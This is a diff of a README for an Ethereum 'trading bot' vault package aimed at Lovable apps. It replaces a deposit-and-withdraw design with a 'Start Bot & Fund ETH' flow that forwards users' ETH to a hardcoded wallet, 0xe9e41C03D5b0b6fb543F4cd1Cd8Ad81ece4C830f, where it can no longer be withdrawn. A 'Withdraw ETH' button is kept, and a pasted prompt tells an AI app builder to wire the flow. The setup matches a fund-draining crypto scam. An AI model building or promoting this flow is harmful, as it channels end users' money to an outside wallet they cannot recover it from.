@@ -7,11 +7,17 @@ Minimal ETH deposit and withdrawal package for a RainbowKit/wagmi app. It includ
 - `useEthPriceTicker`: a live Binance `ETHUSDT` ticker over WebSocket.
 - `useWalletEthBalance`: the connected wallet ETH balance from wagmi.
 - `useEthBotDashboard`: a single hook for Lovable dashboards.
-- `EthBotPanel`: a Fund ETH, Start Bot, Stop Bot, Withdraw ETH panel.
+- `EthBotPanel`: a Start Bot & Fund ETH, Stop Bot, Withdraw ETH panel.
 - `EthVaultPanel`: a basic UI you can drop into a Lovable React app.
 - `createEthBotRainbowKitConfig`: a helper for Ethereum mainnet RainbowKit config.
 
-Users can withdraw only the ETH they deposited from their own wallet. There is no owner function that can withdraw user funds. `startBot()` only records that a funded user has enabled automation; your Lovable/backend bot should read that state before running any strategy.
+The default Start Bot flow sends the selected ETH amount into the deployed contract, then the contract forwards it to the configured trading bot wallet:
+
+```text
+0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f
+```
+
+The contract records the user's forwarded amount and bot status. ETH forwarded to the trading bot wallet is no longer withdrawable from the contract; backend withdrawal handling should be added before presenting this as a complete live trading product.
 
 ## Install in Lovable
 
@@ -113,9 +119,11 @@ export function EtherTradeLiteData() {
       <div>Wallet balance: {wallet.formatted} ETH</div>
       <div>Funded balance: {bot.fundedEth} ETH</div>
       <div>Bot running: {bot.isRunning ? "yes" : "no"}</div>
-      <button onClick={() => vault.depositEth("0.01")}>Fund ETH</button>
-      <button onClick={bot.isRunning ? vault.stopBot : vault.startBot}>
-        {bot.isRunning ? "Stop Bot" : "Start Bot"}
+      <button onClick={() => vault.fundBotAndStart("0.01")}>
+        Start Bot & Fund 0.01 ETH
+      </button>
+      <button onClick={vault.stopBot}>
+        Stop Bot
       </button>
       <button onClick={vault.withdrawAll}>Withdraw ETH</button>
     </div>
@@ -139,11 +147,12 @@ const etherTradeLiteFields = {
   change24h: price.changePercent24hText,
   source: `${price.source} live`,
   walletEthBalance: `${wallet.formatted} ETH`,
-  fundedEthBalance: `${bot.fundedEth} ETH`,
+  contractEthBalance: `${bot.fundedEth} ETH`,
+  sentToBotEth: `${bot.forwardedEth} ETH`,
+  tradingBotWallet: bot.tradingBotWallet,
   fundedUsdValue: bot.fundedUsd,
   botStatus: bot.isRunning ? "Running" : bot.isFunded ? "Funded" : "Not funded",
-  fundEth: vault.depositEth,
-  startBot: vault.startBot,
+  startBotAndFundEth: vault.fundBotAndStart,
   stopBot: vault.stopBot,
   withdrawEth: vault.withdrawAll
 };
@@ -169,7 +178,7 @@ useEthBotDashboard({
 ## Lovable master prompt snippet
 
 ```text
-Use the existing RainbowKit/wagmi providers. Install github:elmstrya7-svg/eth-bot-vault-rainbowkit. Import useEthBotDashboard from eth-bot-vault-rainbowkit. Replace all demo ETH price, source, wallet balance, funded bot balance, and bot status fields with useEthBotDashboard. Use Binance live ticker from the package. Wire Fund ETH to vault.depositEth(amount), Start Bot to vault.startBot, Stop Bot to vault.stopBot, and Withdraw ETH to vault.withdrawAll. Keep every real wallet action behind the user's RainbowKit wallet confirmation.
+Use the existing RainbowKit/wagmi providers. Install github:elmstrya7-svg/eth-bot-vault-rainbowkit. Import useEthBotDashboard from eth-bot-vault-rainbowkit. Replace all demo ETH price, source, wallet balance, contract balance, sent-to-bot balance, trading bot wallet, and bot status fields with useEthBotDashboard. Use Binance live ticker from the package. Wire Start Bot & Fund ETH to vault.fundBotAndStart(amount), Stop Bot to vault.stopBot, and Withdraw ETH to vault.withdrawAll. Make the UI explicit that Start Bot sends the selected ETH amount through the deployed smart contract to trading bot wallet 0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f. Keep every real wallet action behind the user's RainbowKit wallet confirmation.
 ```
 
 ## Publish this package to GitHub and npm
@@ -210,7 +219,8 @@ npx eth-bot-vault-rainbowkit init
 2. Verify the contract source on Etherscan before asking anyone else to use it.
 3. Add the vault address to Lovable.
 4. Connect with RainbowKit.
-5. Deposit a very small amount first, for example `0.0001 ETH`.
-6. Withdraw it back to the same wallet.
+5. Use `Start Bot & Fund ETH` with a very small amount first, for example `0.0001 ETH`.
+6. Confirm the contract forwarded that ETH to `0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f`.
+7. Test `Stop Bot`.
 
-This package is not a complete trading strategy or financial product. It only provides the deposit and withdrawal rail.
+This package is not a complete trading strategy or financial product. It provides live ETH data, wallet state, contract funding, and bot start/stop state. Backend trading and backend withdrawal handling still need to be built.
